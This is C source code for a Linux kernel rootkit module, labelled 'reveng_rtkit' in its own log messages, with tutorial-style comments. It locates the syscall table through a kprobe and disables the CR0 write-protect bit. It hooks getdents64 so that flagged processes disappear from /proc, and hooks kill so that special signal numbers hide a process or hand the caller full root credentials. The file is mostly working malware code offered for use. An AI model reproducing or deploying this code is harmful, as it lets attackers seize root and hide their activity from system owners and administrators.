#include <linux/syscalls.h>     /* Needed to use syscall functions */
#include <linux/slab.h>         /* kmalloc(), kfree(), kzalloc() */
#include <linux/sched.h>        /* task_struct: Core info about all the tasks */
#include <linux/fdtable.h>      /* Open file table structure: files_struct structure */
#include <linux/proc_ns.h>	

#include <asm/ptrace.h>		/* For intercepting syscall, struct named pt_regs is needed */


#ifndef __NR_getdents
#define __NR_getdents 141
#endif

// =============================================================================

#include <linux/dirent.h>	/* struct dirent refers to directory entry. */

struct linux_dirent {
        unsigned long   d_ino;		/* inode number */
        unsigned long   d_off;		/* offset to the next dirent */
        unsigned short  d_reclen;	/* length of this record */
        char            d_name[1];	/* filename */
};

#define PF_INVISIBLE 0x10000000

#define HIDE_UNHIDE_PROCESS 31
#define GET_ROOT 64

// ==================================================================================

/* For storing read cr0 control register value
 *
 * link: https://elixir.bootlin.com/linux/v5.11/source/arch/x86/include/asm/paravirt_types.h#L111
 *
 * unsigned long (*read_cr0)(void);
 */
unsigned long cr0;

// To store the address of the found sys_call_table
static unsigned long *__sys_call_table;

// Defining a custom function type to store original syscalls
typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);

static tt_syscall orig_getdents64;
static tt_syscall orig_kill;


/* kprobe:
 * Acc. to: https://ish-ar.io/kprobes-in-a-nutshell/
 * 
 * Kprobes enables you to dynamically break into any kernel routine 
 * and collect debugging and performance information non-disruptively.
 *
 * Basically,we would use it as an alternative way to create a custom kallsyms_lookup_name function which can actually be exported to kernel (>5.7) 
 */ 
#include <linux/kprobes.h>

/*
 * link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/kprobes.h#L75
 *
 * struct kprobe {
 *      ...
 *
 *      // Allow user to indicate symbol name of the probe point
 *      const char *symbol_name;
 *      ...
 *      }
 */

static struct kprobe kp = {
            .symbol_name = "kallsyms_lookup_name"
};

/* For storing address of sys_call_table */

unsigned long *get_syscall_table(void)
{
	unsigned long *syscall_table;

	//Defining custom kallsyms_lookup_name function type named: kallsyms_lookup_name_t, so that kallsyms_lookup_name be exported to kernel (>5.7)
	
	/* // Lookup the address for a symbol. Returns 0 if not found.
	 * unsigned long kallsyms_lookup_name(const char *name);
	 * 
	 */
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);

	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
}

/* Technique taken from: https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5. */

struct task_struct *find_task(pid_t pid)
{
	struct task_struct *target_process = current;

	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601
	 * for loop macro
	 * #define for_each_process(p) \
	 * for (p = &init_task ; (p = next_task(p)) != &init_task ; )
	 */
	for_each_process(target_process)
	{
		if (target_process->pid == pid)
		{
			return target_process;
		}
	}
	return NULL;
}

static int is_invisible(pid_t pid)
{
	struct task_struct *task;

	if (!pid)
	{
		return 0;
	}

	task = find_task(pid);
	if (!task)
	{
		return 0;
	}
	if (task->flags & PF_INVISIBLE)
	{
		return 1;
	}
	return 0;
}

static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
{
	/* Storing file descriptor
	 * 
	 * link: https://xcellerator.github.io/posts/linux_rootkits_02/
	 *
	 * paraphrasing:
	 * Back in 2016, arguments were passed to the syscall exactly how it appears to be. 
	 * If we were writing a hook for sys_read, we’d just have to imitate this function declaration ourselves 
	 * and (once we’d put the hook in place), we’d be able to play with these arguments however we like.
	 *
	 * With (64-bit) kernel version 4.17.0, this changed. 
	 * The arguments that are first stored in registers by the user are 
	 * copied into a special struct called pt_regs, and then this is the 
	 * only thing passed to the syscall. The syscall is then responsible 
	 * for pulling the arguments it needs out of this struct.
	 */
	int fd = (int) pt_regs->di;

	// Storing the name of the directory passed from user space via "si" register
	struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;

	int ret = orig_getdents64(pt_regs), err;

	unsigned short proc = 0;
	unsigned long offset = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;

	//For storing the directory inode value
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L680
	 * 
	 * kzalloc - allocate memory. The memory is set to zero.
	 * @size: how many bytes of memory are required.
	 * @flags: the type of memory to allocate (see kmalloc).
	 *
	 * static inline void *kzalloc(size_t size, gfp_t flags)
	 */
	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L538
	 *
	 * Below is a brief outline of the most useful GFP flags
	 * %GFP_KERNEL
	 *	Allocate normal kernel ram. May sleep.
	 */
	kdirent = kzalloc(ret, GFP_KERNEL);

	if (kdirent == NULL)
		return ret;

	// Copying directory/pid name from userspace to kernel space
	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

	// Storing the inode value of the required directory(or pid) 
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (offset < ret)
	{
		dir = (void *)kdirent + offset;

		if ((proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
		{
			if (dir == kdirent)
			{
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		}
		else
		{
			prev = dir;
		}
		offset += dir->d_reclen;
	}
	
	err = copy_to_user(dirent, kdirent, ret);
	
	if (err)
	{
		goto out;
	}

out:
	kfree(kdirent);
	return ret;
}

// ============================= Alloting root privileges ==================

static void set_root(void)
{
	/*
	 * pwd: /lib/modules/5.11.0-49-generic/build/include/linux/cred.h
	 * 
	 * struct cred {
	 * 	...
	 *	kuid_t		uid;		// real UID of the task
	 *	kgid_t		gid;		// real GID of the task 
	 * 	kuid_t		suid;		// saved UID of the task
	 *	kgid_t		sgid;		// saved GID of the task
	 *	kuid_t		euid;		// effective UID of the task
	 *	kgid_t		egid;		// effective GID of the task
	 *	kuid_t		fsuid;		// UID for VFS ops
	 *	kgid_t		fsgid;		// GID for VFS ops
	 *	...
	 * };
	 * 
	 * ...
	 * extern struct cred *prepare_creds(void);	// returns current credentials of the process
	 * ...
	 * extern int commit_creds(struct cred *);	// For setting modified values of ids to cred structure
	 */

	struct cred *root = prepare_creds();

	if (root == NULL)
	{
		return;
	}

	// Updating ids to 0 i.e. root
	root->uid.val = root->gid.val = 0;
	root->euid.val = root->egid.val = 0;
	root->suid.val = root->sgid.val = 0;
	root->fsuid.val = root->fsgid.val = 0;

	// Setting the updated value to cred structure
	commit_creds(root);
}

static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;

	struct task_struct *task;
	switch (sig)
	{
		case HIDE_UNHIDE_PROCESS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			printk(KERN_INFO "[*] reveng_rtkit: Hiding/unhiding pid: %d \n", pid);
			break;
		case GET_ROOT:
			printk(KERN_INFO "[*] reveng_rtkit: From rootkit with love :)\t-> Offering root shell!!");
			/*
				In someway system() function alike kernel function present in linux kernel programming
				is required. in order to execute bash/sh shell then grant root shell as fish shell (in my
				case) was alloted a root shell, but bash/sh shell did the job.
			*/
			set_root();
			break;
		default:
			return orig_kill(pt_regs);
	}
	return 0;
}


static inline void write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void)
{
	printk(KERN_INFO "[*] reveng_rtkit: (Memory protected): Regainig normal memory protection\n");
	write_cr0_forced(cr0);	// Setting WP flag to 1 => read-only
}

static inline void unprotect_memory(void)
{
	pr_info("[*] reveng_rtkit: (Memory unprotected): Ready for editing Syscall Table");
	write_cr0_forced(cr0 & ~0x00010000);	// Setting WP flag to 0 => writable
}

